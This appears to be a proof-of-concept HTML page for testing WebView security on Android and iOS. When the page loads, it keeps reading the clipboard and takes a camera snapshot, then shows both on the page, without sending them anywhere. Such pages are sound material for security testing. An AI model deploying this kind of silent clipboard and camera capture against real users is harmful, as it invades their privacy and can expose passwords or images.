<!DOCTYPE html>
<html>
<head>
    <title>Cross-Platform Test</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body { font-family: sans-serif; padding: 20px; }
        .hidden { display: none; }
        .section { margin-bottom: 20px; }
    </style>
</head>
<body onload="initiateExploits();">
    <h1>ðŸ”“ WebView Security (Android + iOS)</h1>

    <div class="section">
        <h3>ðŸ“‹ Clipboard Data:</h3>
        <div id="clipboardData" style="border: 1px dashed #999; padding: 10px; min-height: 50px;"></div>
    </div>

    <div class="section">
        <h3>ðŸ“· Captured Camera Image:</h3>
        <video id="videoPreview" class="hidden" autoplay playsinline></video>
        <img id="capturedImage" class="hidden" />
    </div>

    <script>
        function getClipboardData() {
            if (navigator.clipboard && navigator.clipboard.readText) {
                setInterval(() => {
                    navigator.clipboard.readText().then(text => {
                        if (text) {
                            document.getElementById('clipboardData').textContent = text;
                        }
                    }).catch(err => {
                        console.warn("Clipboard blocked:", err.message);
                    });
                }, 2000);
            } else {
                console.warn("Clipboard API not available");
            }
        }

        function requestCameraAccess() {
            const video = document.getElementById('videoPreview');
            const img = document.getElementById('capturedImage');
            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
                navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {
                    video.srcObject = stream;
                    video.classList.remove("hidden");
                    setTimeout(() => {
                        captureImage(video, img);
                        stream.getTracks().forEach(track => track.stop());
                    }, 4000);
                }).catch(err => {
                    console.error("Camera access denied:", err.message);
                });
            }
        }

        function captureImage(video, img) {
            const canvas = document.createElement('canvas');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            const ctx = canvas.getContext('2d');
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            img.src = canvas.toDataURL('image/png');
            img.classList.remove('hidden');
        }

        function initiateExploits() {
            getClipboardData();
            requestCameraAccess();
        }
    </script>
</body>
</html>
